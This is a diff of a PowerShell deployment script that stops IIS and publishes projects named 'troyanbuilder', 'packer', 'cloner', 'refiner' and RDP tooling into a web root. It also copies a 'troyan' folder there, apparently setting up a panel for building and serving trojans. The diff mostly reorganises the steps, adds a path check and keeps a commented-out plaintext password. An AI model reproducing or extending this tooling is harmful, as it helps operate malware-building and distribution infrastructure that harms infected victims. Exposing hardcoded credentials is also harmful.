@@ -1,6 +1,13 @@
 param (
-    [string]$serverIp, [string]$user, [string]$password, [bool]$direct=$false
+    [string]$serverIp, [string]$user, [string]$password, [string]$direct="false"
 )
+
+
+if (Get-Service -Name W3SVC -ErrorAction SilentlyContinue) {
+    Stop-Service -Name W3SVC
+} else {
+    Write-Host "Service W3SVC does not exist."
+}
 
 if ($serverIp -eq "") {
     # $password = "UaS6Ln5d9S"
@@ -16,11 +23,6 @@ $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 Set-Location -Path $scriptDir
 . ".\lib.ps1"
 
-if (Get-Service -Name W3SVC -ErrorAction SilentlyContinue) {
-    Stop-Service -Name W3SVC
-} else {
-    Write-Host "Service W3SVC does not exist."
-}
 Add-Type -AssemblyName "System.IO.Compression.FileSystem"
 $www="C:\inetpub\wwwroot"   
 function AddTrusted {
@@ -64,38 +66,43 @@ catch {
 function Output(){
     Set-Location -Path $scriptDir
     Write-Host $scriptDir
-    Clear-Folder -FolderPath "C:\inetpub\wwwroot\cp"
-
-    Set-Location -Path $scriptDir
-    Copy-Item -Path "../rdp/*" -Destination "C:\inetpub\wwwroot\cp" -Force -Recurse
-
-    Set-Location -Path ../refiner
-    dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained
-
-    Set-Location -Path $scriptDir
-    Set-Location -Path ../troyanbuilder
-    dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained
-
-    Set-Location -Path $scriptDir
-    Set-Location -Path ../cloner
-    dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained
-
-    Set-Location -Path $scriptDir
-    Set-Location -Path ../packer
-    dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained
-        
-    Set-Location -Path $scriptDir
-    Set-Location -Path ../cp
-    dotnet build
-    dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release
     
+    if ($scriptDir -like "*hephaestus*")
+    {
+        Clear-Folder -FolderPath "C:\inetpub\wwwroot\cp"
 
-    $nullSource = Split-Path -Path $PSScriptRoot -Parent
-    Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "sys") -DestinationPath "$www\sys" -Clear $true
-    Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "troyan") -DestinationPath "$www\troyan" -Clear $true
-    Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "ads") -DestinationPath "$www\ads" -Clear $false
-    Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "php") -DestinationPath "$www\php"  -Clear $true
-    Copy-Item -Path (Join-Path -Path $nullSource -ChildPath "defaulticon.ico") -Destination "$www\defaulticon.ico" -Force
+        Set-Location -Path $scriptDir
+        Copy-Item -Path "../rdp/*" -Destination "C:\inetpub\wwwroot\cp" -Force -Recurse
+
+        Set-Location -Path ../refiner
+        dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained
+
+        Set-Location -Path $scriptDir
+        Set-Location -Path ../troyanbuilder
+        dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained
+
+        Set-Location -Path $scriptDir
+        Set-Location -Path ../cloner
+        dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained
+
+        Set-Location -Path $scriptDir
+        Set-Location -Path ../packer
+        dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release -r win-x64 --self-contained
+            
+        Set-Location -Path $scriptDir
+        Set-Location -Path ../cp
+        dotnet build
+        dotnet publish -o "C:\inetpub\wwwroot\cp" -c Release
+        
+
+        $nullSource = Split-Path -Path $PSScriptRoot -Parent
+        Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "sys") -DestinationPath "$www\sys" -Clear $true
+        Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "troyan") -DestinationPath "$www\troyan" -Clear $true
+        Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "ads") -DestinationPath "$www\ads" -Clear $false
+        Copy-Folder -SourcePath (Join-Path -Path $nullSource -ChildPath "php") -DestinationPath "$www\php"  -Clear $true
+        Copy-Item -Path (Join-Path -Path $nullSource -ChildPath "defaulticon.ico") -Destination "$www\defaulticon.ico" -Force
+
+    }
     
     Set-Location -Path $scriptDir
 
@@ -125,7 +132,6 @@ function Kill-TaskByName {
 
 Kill-TaskByName("SharpRdp")
 Output;
-Defaults;
 
 $dirs = @(Get-ChildItem -Directory -Path "C:\data")
 
@@ -427,7 +433,7 @@ function Install{
     Write-Host "Publish $serverName is complete"
 }
 
-if (-not $direct)
+if ($direct -eq "false")
 {
     foreach ($dir in $dirs)
     {
